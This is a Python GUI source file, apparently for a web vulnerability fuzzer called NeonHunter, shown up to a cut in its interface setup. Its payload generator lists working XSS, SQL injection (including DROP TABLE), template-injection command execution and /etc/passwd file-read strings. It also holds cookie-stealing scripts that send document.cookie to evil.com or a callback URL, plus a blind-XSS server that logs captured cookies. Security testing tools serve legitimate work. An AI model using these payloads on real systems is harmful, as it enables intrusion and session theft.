import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
from bs4 import BeautifulSoup
import threading
import time
import os
import json
import csv
from datetime import datetime
import queue as pyqueue
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
import webbrowser
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from itertools import cycle
import winsound
import base64
import re
import ipaddress
import random
import string
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid
import html
import traceback
import math

app = None

class BlindCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        referer = self.headers.get('Referer', 'None')
        cookies = self.headers.get('Cookie', 'None')
        
        self.wfile.write(b"""
        <html>
        <head>
            <title>NeonHunter Blind XSS Detected</title>
            <style>
                body { background: #000; color: #0f0; font-family: monospace; }
                h1 { color: #f0f; text-shadow: 0 0 10px #f0f; }
                .info { border: 1px solid #0ff; padding: 10px; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>BLIND XSS PAYLOAD TRIGGERED!</h1>
            <div class="info">
                <p>Your session has been captured by NeonHunter.</p>
                <p>This is a security test notification.</p>
            </div>
        </body>
        </html>
        """)
        
        if app:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"""
[BLIND XSS CALLBACK] {timestamp}
├── IP: {client_ip}
├── User-Agent: {user_agent}
├── Referer: {referer}
├── Cookies: {cookies}
└── Path: {self.path}
"""
            app.log(log_entry)
            app.log_live_request('CALLBACK', f"Blind XSS from {client_ip}", 200)
            
            blind_log = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'user_agent': user_agent,
                'referer': referer,
                'cookies': cookies,
                'path': self.path
            }
            app.save_blind_xss_log(blind_log)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"POST received")
        
        if app:
            client_ip = self.client_address[0]
            app.log(f"[!!!] POST CALLBACK from {client_ip} - Data: {post_data[:100]}...")
            app.log_live_request('POST-CALLBACK', f"POST from {client_ip}", 200)

    def log_message(self, format, *args):
        return

class AdvancedNeonToggle(tk.Canvas):
    def __init__(self, master, variable, command=None, toggle_width=80, toggle_height=36, **kwargs):
        kwargs.pop('width', None)
        kwargs.pop('height', None)
        
        super().__init__(master, width=toggle_width, height=toggle_height, 
                         highlightthickness=0, bg='#000000', **kwargs)
        self.var = variable
        self.command = command
        self.state = variable.get()
        
        self.off_bg = "#220044"
        self.on_bg = "#00ff88"
        self.knob_color = "#ffffff"
        self.glow_color = "#00ffff"
        self.border_color = "#ff00ff"
        self.text_color = "#ffffff"
        
        self.bind("<Button-1>", self.toggle)
        self.bind("<B1-Motion>", self.toggle)
        variable.trace_add("write", self._on_var_changed)
        self._draw()
        
    def _draw(self):
        self.delete("all")
        state = self.var.get()
        bg_color = self.on_bg if state else self.off_bg
        text = "ON" if state else "OFF"
        
        self.create_rectangle(2, 2, 78, 34, fill=bg_color, outline=self.border_color, width=3)
        
        x = 55 if state else 25
        for i in range(3, 0, -1):
            self.create_oval(x-10-i, 5-i, x+10+i, 25+i, 
                           outline=self.glow_color, width=1, 
                           fill='' if i==3 else self.knob_color)
        
        self.create_text(40, 18, text=text, fill=self.text_color, 
                        font=('Consolas', 10, 'bold'))
        
    def toggle(self, event=None):
        self.var.set(not self.var.get())
        self._draw()
        if self.command:
            self.command()
        if app:
            app.play_click_sound()
            
    def _on_var_changed(self, *args):
        self._draw()

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.current_session = "default"
        
    def create_session(self, name, headers=None, cookies=None, proxies=None):
        session = requests.Session()
        if headers:
            session.headers.update(headers)
        if cookies:
            session.cookies.update(cookies)
        if proxies:
            session.proxies.update(proxies)
        self.sessions[name] = session
        return session
    
    def get_session(self, name="default"):
        return self.sessions.get(name, requests.Session())

class AdvancedPayloadGenerator:
    @staticmethod
    def generate_xss_payloads(callback_url=None):
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '\'"--></style></scRipt><scRipt>alert(1)</scRipt>',
            '<iframe src="javascript:alert(`xss`)">',
            '<script>document.location="http://evil.com?c="+document.cookie</script>',
            '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
        ]
        
        if callback_url:
            payloads.extend([
                f'<script>fetch("{callback_url}?cookie="+document.cookie)</script>',
                f'<img src=x onerror="fetch(\'{callback_url}?data=\'+btoa(document.cookie))">',
            ])
        
        return payloads
    
    @staticmethod
    def generate_sqli_payloads():
        return [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR 1=1--",
            "' AND 1=0 UNION SELECT 1,2,3--",
            "' AND ExtractValue(0,CONCAT(0x3a,USER()))--",
        ]
    
    @staticmethod
    def generate_ssti_payloads():
        return [
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
            '{{config}}',
            '{{settings.SECRET_KEY}}',
            '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("id").read()}}{% endif %}{% endfor %}',
        ]
    
    @staticmethod
    def generate_open_redirect_payloads():
        return [
            'https://google.com',
            '//evil.com',
            'javascript:alert(1)',
            '/\\evil.com',
            'http://%65%76%69%6C%2E%63%6F%6D',
            '%0D%0A%0D%0Ahttps://google.com',
        ]
    
    @staticmethod
    def generate_hpp_payloads():
        return [
            'id=1&id=admin',
            'user=guest&user=admin',
            'role=user&role[]=admin',
            'param=value&param=overwrite',
        ]
    
    @staticmethod
    def generate_lfi_payloads():
        return [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '/proc/self/environ',
            'file:///etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
        ]
    
    @staticmethod
    def generate_command_injection_payloads():
        return [
            '; id',
            '| whoami',
            '`cat /etc/passwd`',
            '$(ls -la)',
            '|| ping -c 10 127.0.0.1',
            '&& cat /etc/passwd',
        ]
    
    @staticmethod
    def generate_custom_payload_from_text(text):
        """Generate payloads from custom text input"""
        payloads = []
        lines = text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                payloads.append(line)
        return payloads

class BatchProcessor:
    def __init__(self, app):
        self.app = app
        self.targets = []
        self.current_target_index = 0
        self.batch_results = []
        self.is_batch_running = False
        
    def load_targets_from_file(self, filepath):
        """Load multiple targets from a file"""
        try:
            with open(filepath, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            self.targets = []
            for target in targets:
                if target and not target.startswith('#'):
                    if not target.startswith(('http://', 'https://')):
                        target = 'http://' + target
                    self.targets.append(target)
            
            return len(self.targets)
        except Exception as e:
            self.app.log(f"Error loading targets: {e}")
            return 0
    
    def start_batch_scan(self):
        """Start scanning multiple targets"""
        if not self.targets:
            messagebox.showwarning("No Targets", "Load targets first!")
            return
        
        self.is_batch_running = True
        self.current_target_index = 0
        self.batch_results = []
        
        self.app.log(f"Starting batch scan with {len(self.targets)} targets")
        self.scan_next_target()
    
    def scan_next_target(self):
        """Scan the next target in the list"""
        if not self.is_batch_running or self.current_target_index >= len(self.targets):
            self.batch_complete()
            return
        
        target = self.targets[self.current_target_index]
        self.app.log(f"Batch ({self.current_target_index + 1}/{len(self.targets)}): {target}")
        
        self.app.target_entry.delete(0, tk.END)
        self.app.target_entry.insert(0, target)
        
        self.app.start_direct_fuzz()
        
        self.monitor_scan_completion()
    
    def monitor_scan_completion(self):
        """Monitor when current scan completes"""
        if not self.app.is_running and self.is_batch_running:
            target_results = {
                'target': self.targets[self.current_target_index],
                'findings': len(self.app.results),
                'critical': sum(1 for r in self.app.results if r.get('severity') == 'Critical'),
                'timestamp': datetime.now().isoformat()
            }
            self.batch_results.append(target_results)
            
            self.current_target_index += 1
            
            time.sleep(2)
            self.scan_next_target()
        else:
            self.app.root.after(1000, self.monitor_scan_completion)
    
    def batch_complete(self):
        """Handle batch scan completion"""
        self.is_batch_running = False
        total_findings = sum(r['findings'] for r in self.batch_results)
        total_critical = sum(r['critical'] for r in self.batch_results)
        
        self.app.log(f"BATCH SCAN COMPLETE")
        self.app.log(f"Total targets: {len(self.targets)}")
        self.app.log(f"Total findings: {total_findings}")
        self.app.log(f"Critical findings: {total_critical}")
        
        self.generate_batch_report()
    
    def generate_batch_report(self):
        """Generate comprehensive batch report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = f"NEONHUNTER_BATCH_REPORT_{timestamp}.html"
        
        html_content = self.create_batch_report_html()
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.app.log(f"Batch report generated: {report_path}")
        
        messagebox.showinfo("Batch Complete",
                          f"Batch scan completed!\n\n"
                          f"Targets: {len(self.targets)}\n"
                          f"Findings: {sum(r['findings'] for r in self.batch_results)}\n"
                          f"Report: {report_path}")
    
    def create_batch_report_html(self):
        """Create HTML batch report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>NEONHUNTER - Batch Scan Report</title>
    <style>
        :root {{
            --primary: #00ffff;
            --secondary: #ff00ff;
            --accent: #00ff88;
            --dark: #000;
            --darker: #110033;
            --darkest: #000011;
        }}
        
        body {{
            background: var(--dark);
            color: var(--accent);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px;
        }}
        
        .header {{
            text-align: center;
            padding: 40px 0;
            background: linear-gradient(135deg, var(--darker) 0%, #220066 100%);
            border-radius: 20px;
            margin-bottom: 40px;
            border: 3px solid var(--primary);
            box-shadow: 0 0 30px var(--primary);
            position: relative;
            overflow: hidden;
        }}
        
        .header::before {{
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, transparent 30%, var(--primary) 70%);
            opacity: 0.1;
            animation: rotate 20s linear infinite;
        }}
        
        @keyframes rotate {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        h1 {{
            color: var(--primary);
            font-size: 3.5em;
            margin: 0;
            text-shadow: 0 0 20px var(--primary);
            position: relative;
            z-index: 2;
        }}
        
        h2 {{
            color: var(--secondary);
            font-size: 2.2em;
            margin: 20px 0;
            border-left: 5px solid var(--accent);
            padding-left: 15px;
            position: relative;
            z-index: 2;
        }}
        
        .subtitle {{
            color: var(--accent);
            font-size: 1.2em;
            opacity: 0.9;
            position: relative;
            z-index: 2;
        }}
        
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }}
        
        .stat-card {{
            background: linear-gradient(145deg, var(--darker), #220044);
            border: 2px solid var(--primary);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            position: relative;
            overflow: hidden;
        }}
        
        .stat-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.3);
        }}
        
        .stat-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
        }}
        
        .stat-number {{
            font-size: 2.8em;
            font-weight: bold;
            color: var(--primary);
            margin: 10px 0;
        }}
        
        .stat-label {{
            color: var(--accent);
            font-size: 1.1em;
            opacity: 0.9;
        }}
        
        .table-container {{
            background: var(--darker);
            border-radius: 15px;
            padding: 25px;
            margin: 40px 0;
            border: 2px solid var(--secondary);
            overflow-x: auto;
        }}
        
        table {{
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }}
        
        th {{
            background: linear-gradient(135deg, var(--secondary), #cc00ff);
            color: white;
            padding: 18px;
            text-align: left;
            font-size: 1.1em;
            position: sticky;
            top: 0;
        }}
        
        td {{
            padding: 15px;
            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
            transition: background 0.3s;
        }}
        
        tr:hover td {{
            background: rgba(0, 255, 255, 0.05);
        }}
        
        .critical {{
            color: #ff0000;
            font-weight: bold;
            animation: pulse 1.5s infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.7; }}
        }}
        
        .high {{ color: #ff6600; }}
        .medium {{ color: #ffff00; }}
        .low {{ color: #00ff00; }}
        
        .recommendations {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }}
        
        .recommendation-card {{
            background: linear-gradient(145deg, #001100, #003300);
            border: 2px solid var(--accent);
            border-radius: 15px;
            padding: 25px;
            position: relative;
            overflow: hidden;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 60px;
            padding-top: 40px;
            border-top: 3px solid var(--secondary);
            color: var(--accent);
            font-size: 1.1em;
        }}
        
        .neon-text {{
            color: var(--primary);
            text-shadow: 0 0 10px var(--primary);
            font-weight: bold;
        }}
        
        .glow {{
            animation: glow 2s ease-in-out infinite alternate;
        }}
        
        @keyframes glow {{
            from {{ text-shadow: 0 0 10px var(--primary); }}
            to {{ text-shadow: 0 0 20px var(--primary), 0 0 30px var(--secondary); }}
        }}
        
        .watermark {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            opacity: 0.1;
            font-size: 10em;
            color: var(--primary);
            pointer-events: none;
        }}
        
        .severity-badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9em;
            margin: 2px;
        }}
        
        .severity-critical {{ background: rgba(255, 0, 0, 0.2); color: #ff0000; border: 1px solid #ff0000; }}
        .severity-high {{ background: rgba(255, 102, 0, 0.2); color: #ff6600; border: 1px solid #ff6600; }}
        .severity-medium {{ background: rgba(255, 255, 0, 0.2); color: #ffff00; border: 1px solid #ffff00; }}
        .severity-low {{ background: rgba(0, 255, 0, 0.2); color: #00ff00; border: 1px solid #00ff00; }}
        
        .scan-metrics {{
            background: linear-gradient(135deg, #000033, #330033);
            border-radius: 15px;
            padding: 30px;
            margin: 30px 0;
            border: 2px solid var(--primary);
        }}
        
        .metric-item {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }}
        
        .metric-item:last-child {{
            border-bottom: none;
        }}
        
        .metric-value {{
            font-size: 1.3em;
            color: var(--primary);
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="watermark">NEONHUNTER</div>
    
    <div class="container">
        <div class="header">
            <h1 class="glow">NEONHUNTER PRO</h1>
            <h2>Advanced Batch Security Assessment Report</h2>
            <div class="subtitle">
                <p>Professional Web Vulnerability Scanner | Version 3.5</p>
                <p>Generated: {timestamp}</p>
            </div>
        </div>
        
        <div class="scan-metrics">
            <h2>SCAN METRICS OVERVIEW</h2>
            <div class="metric-item">
                <span>Total Targets Scanned:</span>
                <span class="metric-value">{len(self.targets)}</span>
            </div>
            <div class="metric-item">
                <span>Total Findings Identified:</span>
                <span class="metric-value">{sum(r['findings'] for r in self.batch_results)}</span>
            </div>
            <div class="metric-item">
                <span>Critical Vulnerabilities:</span>
                <span class="metric-value">{sum(r['critical'] for r in self.batch_results)}</span>
            </div>
            <div class="metric-item">
                <span>Scan Success Rate:</span>
                <span class="metric-value">{round((len([r for r in self.batch_results if r['findings'] > 0]) / len(self.targets) * 100) if self.targets else 0, 1)}%</span>
            </div>
        </div>
        
        <div class="summary-grid">
            <div class="stat-card">
                <div class="stat-number">{len(self.targets)}</div>
                <div class="stat-label">Targets Scanned</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-number">{sum(r['findings'] for r in self.batch_results)}</div>
                <div class="stat-label">Total Findings</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-number">{sum(r['critical'] for r in self.batch_results)}</div>
                <div class="stat-label">Critical Issues</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-number">
                    {round(sum(r['findings'] for r in self.batch_results) / len(self.targets), 1) if self.targets else 0}
                </div>
                <div class="stat-label">Avg Findings per Target</div>
            </div>
        </div>
        
        <h2>TARGETS SCAN RESULTS</h2>
        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Target URL</th>
                        <th>Findings</th>
                        <th>Critical</th>
                        <th>Status</th>
                        <th>Security Score</th>
                    </tr>
                </thead>
                <tbody>
"""
        
        for i, result in enumerate(self.batch_results, 1):
            status = "Secure" if result['findings'] == 0 else "Vulnerable" if result['critical'] == 0 else "Critical"
            score = 100 - min(100, result['findings'] * 10 + result['critical'] * 30)
            
            html += f"""
                    <tr>
                        <td>{i}</td>
                        <td><span class="neon-text">{html.escape(result['target'][:60])}</span>{'...' if len(result['target']) > 60 else ''}</td>
                        <td><span class="{'critical' if result['findings'] > 5 else 'high' if result['findings'] > 2 else 'medium'}">{result['findings']}</span></td>
                        <td><span class="critical">{result['critical']}</span></td>
                        <td>
                            <span class="severity-badge severity-{'critical' if status == 'Critical' else 'high' if status == 'Vulnerable' else 'low'}">
                                {status}
                            </span>
                        </td>
                        <td>
                            <div style="background: rgba(255,255,255,0.1); border-radius: 10px; height: 20px; margin: 5px 0;">
                                <div style="background: {'#00ff00' if score > 80 else '#ffff00' if score > 60 else '#ff6600' if score > 40 else '#ff0000'}; 
                                     width: {score}%; height: 100%; border-radius: 10px; transition: width 1s;">
                                </div>
                            </div>
                            <span class="{'critical' if score < 40 else 'high' if score < 60 else 'medium' if score < 80 else 'low'}">
                                {score}/100
                            </span>
                        </td>
                    </tr>
"""
        
        html += """
                </tbody>
            </table>
        </div>
        
        <h2>SECURITY RECOMMENDATIONS</h2>
        <div class="recommendations">
            <div class="recommendation-card">
                <h3>Immediate Actions</h3>
                <ul>
                    <li>Patch all critical vulnerabilities within 24 hours</li>
                    <li>Implement Web Application Firewall (WAF)</li>
                    <li>Review authentication mechanisms</li>
                    <li>Update all third-party dependencies</li>
                </ul>
            </div>
            
            <div class="recommendation-card">
                <h3>Short-term Improvements</h3>
                <ul>
                    <li>Implement proper input validation</li>
                    <li>Add security headers (CSP, HSTS)</li>
                    <li>Regular security scanning</li>
                    <li>Develop incident response plan</li>
                </ul>
            </div>
            
            <div class="recommendation-card">
                <h3>Long-term Strategy</h3>
                <ul>
                    <li>Establish security training program</li>
                    <li>Implement DevSecOps pipeline</li>
                    <li>Regular penetration testing</li>
                    <li>Bug bounty program</li>
                </ul>
            </div>
        </div>
        
        <div class="footer">
            <p class="neon-text">NEONHUNTER v3.5 - Elite Security Scanner</p>
            <p>Developed by <strong>Dickson Godwin Massawe</strong></p>
            <p>GitHub: <a href="https://github.com/dkhacker707" style="color: var(--primary);">dkhacker707</a></p>
            <p>For security consultations and custom integrations</p>
            <p>© {datetime.now().strftime('%Y')} NeonHunter | Hunt Ethically, Stay Secure</p>
        </div>
    </div>
</body>
</html>
"""
        return html

# Simple IconButton without PIL dependency
class IconButton(tk.Button):
    def __init__(self, master, text="", icon=None, command=None, **kwargs):
        super().__init__(master, **kwargs)
        
        display_text = f"{icon} {text}" if icon else text
        
        self.config(
            text=display_text,
            command=command,
            bg='#220044',
            fg='#00ffff',
            font=('Consolas', 10, 'bold'),
            relief='raised',
            bd=2,
            padx=15,
            pady=8,
            cursor='hand2',
            activebackground='#00ffff',
            activeforeground='#000000'
        )
        
        self.bind('<Enter>', self.on_enter)
        self.bind('<Leave>', self.on_leave)
        
    def on_enter(self, e):
        self.config(bg='#00ffff', fg='#000000')
    
    def on_leave(self, e):
        self.config(bg='#220044', fg='#00ffff')

class AdvancedNeonHunter:
    def __init__(self, root):
        global app
        app = self
        
        self.root = root
        self.root.title("⚡ NEONHUNTER v3.5 - Ultimate Bug Bounty Suite ⚡")
        self.root.configure(bg='#000000')
        self.root.geometry("1600x950")
        self.root.minsize(1400, 800)
        
        # Initialize all variables first
        self.initialize_variables()
        
        # Setup keyboard shortcuts
        self.setup_keyboard_shortcuts()
        
        # Setup enhanced menu bar
        self.setup_enhanced_menu_bar()
        
        # Initialize core components
        self.initialize_ui()
        
        # Initialize managers
        self.session_manager = SessionManager()
        self.payload_generator = AdvancedPayloadGenerator()
        self.batch_processor = BatchProcessor(self)
        
        # Setup advanced UI
        self.setup_enhanced_ui()
        
        # Load configuration
        self.load_config()
        
        # Start advanced features
        self.start_advanced_features()
        
        # Play startup sound
        self.play_startup_sound()
        self.log("⚡ NEONHUNTER v3.5 READY - By Dickson Godwin Massawe")
        self.log("🎨 OPTIMIZED UI FOR BETTER VISIBILITY")
        self.log("📊 Professional Reporting Engine Activated")
        self.log("🔧 Advanced Features Enabled")
    
    def initialize_variables(self):
        """Initialize all variables first before UI creation"""
        self.live_window = None
        self.status_window = None
        self.live_text = None
        self.status_text = None
        
        self.fuzz_thread = None
        self.is_running = False
        self.is_paused = False
        self.stop_event = threading.Event()
        
        self.results = []
        self.log_queue = pyqueue.Queue()
        self.blind_server = None
        self.callback_ip = self.get_local_ip()
        
        self.scan_start_time = None
        self.total_payloads_tested = 0
        self.vuln_counter = 0
        
        # Enhanced statistics
        self.stats = {
            'requests_sent': 0,
            'requests_success': 0,
            'errors': 0,
            'warnings': 0,
            'critical_findings': 0,
            'high_findings': 0,
            'medium_findings': 0,
            'low_findings': 0,
            'start_time': None,
            'end_time': None,
            'scan_duration': '0s',
            'payloads_per_second': 0,
        }
        
        # Initialize theme settings
        self.theme_settings = {
            'font_size': 10,
            'contrast': 'high',
            'animation': True,
            'sound': True,
        }
        
        # Initialize UI variables
        self.title_label = None
        self.subtitle_label = None
        self.target_entry = None
        self.proxy_entry = None
        self.delay_var = None
        self.concurrent_requests = None
        self.timeout_var = None
        self.retry_count = None
        self.rate_limit_var = None
        self.auto_save_var = None
        self.fuzz_btn = None
        self.pause_btn = None
        self.stop_btn = None
        self.progress = None
        self.status_indicator = None
        self.status_text_widget = None
        self.log_text = None
        self.log_search = None
        self.stats_display = None
        self.author_label = None
        self.vulns = {}
        self.payloads = {}
        self.custom_payloads = {}
        
        # Start queue processor
        self.root.after(100, self.process_queue)
    
    def setup_keyboard_shortcuts(self):
        """Setup keyboard shortcuts with more options"""
        shortcuts = [
            ('<Control-o>', lambda e: self.load_targets_file()),
            ('<Control-s>', lambda e: self.save_config()),
            ('<Control-l>', lambda e: self.load_config()),
            ('<Control-f>', lambda e: self.start_direct_fuzz()),
            ('<Control-p>', lambda e: self.toggle_pause()),
            ('<Control-q>', lambda e: self.stop_fuzz()),
            ('<Control-e>', lambda e: self.export_advanced_results()),
            ('<Control-b>', lambda e: self.start_batch_scan()),
            ('<Control-r>', lambda e: self.clear_monitors()),
            ('<F1>', lambda e: self.show_help()),
            ('<F5>', lambda e: self.check_for_updates()),
            ('<F2>', lambda e: self.show_statistics()),
            ('<F3>', lambda e: self.take_manual_screenshot()),
            ('<Control-d>', lambda e: self.show_documentation()),
            ('<Control-t>', lambda e: self.test_connection()),
        ]
        
        for shortcut, command in shortcuts:
            self.root.bind(shortcut, command)
    
    def setup_enhanced_menu_bar(self):
        """Setup enhanced menu bar with icons"""
        menubar = tk.Menu(self.root, bg='#000000', fg='#00ffff', 
                         activebackground='#00ffff', activeforeground='#000000',
                         font=('Consolas', 10))
        self.root.config(menu=menubar)
        
        # File Menu with icons
        file_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#00ffff',
                          activebackground='#00ffff', activeforeground='#000000')
        menubar.add_cascade(label="📁 File", menu=file_menu)
        file_menu.add_command(label="📂 Load Targets File", 
                            accelerator="Ctrl+O",
                            command=self.load_targets_file)
        file_menu.add_command(label="💾 Save Config", 
                            accelerator="Ctrl+S",
                            command=self.save_config)
        file_menu.add_command(label="📥 Load Config", 
                            accelerator="Ctrl+L",
                            command=self.load_config)
        file_menu.add_separator()
        file_menu.add_command(label="📊 Export Report", 
                            accelerator="Ctrl+E",
                            command=self.export_advanced_results)
        file_menu.add_command(label="📈 Export Statistics", 
                            command=self.export_statistics)
        file_menu.add_separator()
        file_menu.add_command(label="📸 Take Screenshot", 
                            accelerator="F3",
                            command=self.take_manual_screenshot)
        file_menu.add_separator()
        file_menu.add_command(label="🚪 Exit", 
                            accelerator="Alt+F4",
                            command=self.on_closing)
        
        # Scan Menu with icons
        scan_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#ff00ff',
                          activebackground='#ff00ff', activeforeground='#000000')
        menubar.add_cascade(label="🔍 Scan", menu=scan_menu)
        scan_menu.add_command(label="🚀 Start Fuzzing", 
                            accelerator="Ctrl+F",
                            command=self.start_direct_fuzz)
        scan_menu.add_command(label="⏯️ Pause/Resume", 
                            accelerator="Ctrl+P",
                            command=self.toggle_pause)
        scan_menu.add_command(label="⏹️ Stop Scan", 
                            accelerator="Ctrl+Q",
                            command=self.stop_fuzz)
        scan_menu.add_separator()
        scan_menu.add_command(label="📋 Batch Scan", 
                            accelerator="Ctrl+B",
                            command=self.start_batch_scan)
        scan_menu.add_command(label="⚡ Quick Scan", 
                            command=self.quick_scan)
        scan_menu.add_command(label="🔬 Deep Scan", 
                            command=self.deep_scan)
        scan_menu.add_separator()
        scan_menu.add_command(label="🧹 Clear Monitors", 
                            accelerator="Ctrl+R",
                            command=self.clear_monitors)
        
        # Tools Menu with icons
        tools_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#00ff88',
                           activebackground='#00ff88', activeforeground='#000000')
        menubar.add_cascade(label="🛠️ Tools", menu=tools_menu)
        tools_menu.add_command(label="👤 Session Manager",
                            command=self.manage_sessions)
        tools_menu.add_command(label="💣 Custom Payloads",
                            command=self.customize_payloads)
        tools_menu.add_command(label="📤 Payload Importer",
                            command=self.import_custom_payloads)
        tools_menu.add_separator()
        tools_menu.add_command(label="🎯 Blind XSS Server",
                            command=self.start_blind_server)
        tools_menu.add_command(label="📸 Screenshot Tool",
                            command=self.take_manual_screenshot)
        tools_menu.add_command(label="🔌 Test Connection",
                            accelerator="Ctrl+T",
                            command=self.test_connection)
        tools_menu.add_command(label="↩️ Replay Request",
                            command=self.replay_request)
        tools_menu.add_command(label="📏 Header Analyzer",
                            command=self.analyze_headers)
        tools_menu.add_command(label="🔐 SSL Checker",
                            command=self.check_ssl)
        
        # View Menu with icons
        view_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#00ccff',
                          activebackground='#00ccff', activeforeground='#000000')
        menubar.add_cascade(label="👁️ View", menu=view_menu)
        view_menu.add_command(label="📊 Show Statistics",
                            accelerator="F2",
                            command=self.show_statistics)
        view_menu.add_command(label="📡 Show Live Requests",
                            command=self.open_monitor_windows)
        view_menu.add_command(label="🎨 Theme Settings",
                            command=self.theme_settings)
        view_menu.add_command(label="👁️‍🗨️ Color Blind Mode",
                            command=self.toggle_color_blind_mode)
        view_menu.add_separator()
        view_menu.add_command(label="🔍 Zoom In",
                            command=lambda: self.zoom_text(1.1))
        view_menu.add_command(label="🔎 Zoom Out",
                            command=lambda: self.zoom_text(0.9))
        view_menu.add_command(label="🔧 Reset Zoom",
                            command=lambda: self.zoom_text(1.0))
        
        # Help Menu with icons
        help_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#ffff00',
                          activebackground='#ffff00', activeforeground='#000000')
        menubar.add_cascade(label="❓ Help", menu=help_menu)
        help_menu.add_command(label="📚 Documentation",
                            accelerator="Ctrl+D",
                            command=self.show_documentation)
        help_menu.add_command(label="📖 Quick Guide",
                            accelerator="F1",
                            command=self.show_help)
        help_menu.add_command(label="🔄 Check Updates",
                            accelerator="F5",
                            command=self.check_for_updates)
        help_menu.add_command(label="⌨️ Keyboard Shortcuts",
                            command=self.show_keyboard_shortcuts)
        help_menu.add_separator()
        help_menu.add_command(label="🌟 About NeonHunter",
                            command=self.show_about)
        help_menu.add_command(label="📖 Project Documentation",
                            command=self.show_project_docs)
        help_menu.add_command(label="🎬 Tutorial Videos",
                            command=self.show_tutorials)
        help_menu.add_command(label="🐛 Report Bug",
                            command=self.report_bug)
        help_menu.add_command(label="💡 Feature Request",
                            command=self.request_feature)
    
    def initialize_ui(self):
        """Initialize the main UI components with optimized visibility"""
        main_frame = tk.Frame(self.root, bg='#000000')
        main_frame.pack(fill='both', expand=True, padx=15, pady=15)
        
        # Enhanced border animation
        self.border_canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
        self.border_canvas.place(relwidth=1, relheight=1)
        self.border_thickness = 15
        self.rainbow_colors = cycle(['#ff0000', '#ff6600', '#ffff00', '#00ff00', '#00ccff', '#6600ff', '#ff00ff'])
        self.border_segments = 60
        self.color_offset = 0
        self.animate_rainbow_border()
        
        # Enhanced grid background
        self.canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
